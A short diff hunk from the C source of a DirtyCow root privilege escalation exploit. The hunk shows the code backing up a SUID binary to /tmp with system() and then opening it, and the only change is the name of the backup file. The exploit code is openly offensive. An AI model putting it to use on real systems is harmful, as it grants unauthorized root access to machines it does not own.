@@ -133,7 +133,7 @@ int main(int argc,char *argv[]) {
     printf("DirtyCow root privilege escalation\n");
     printf("Backing up %s.. to /tmp/bak\n", suid_binary);
  
-    asprintf(&backup, "cp %s /tmp/bak111", suid_binary);
+    asprintf(&backup, "cp %s /tmp/bako", suid_binary);
     system(backup);
  
     f = open(suid_binary,O_RDONLY);
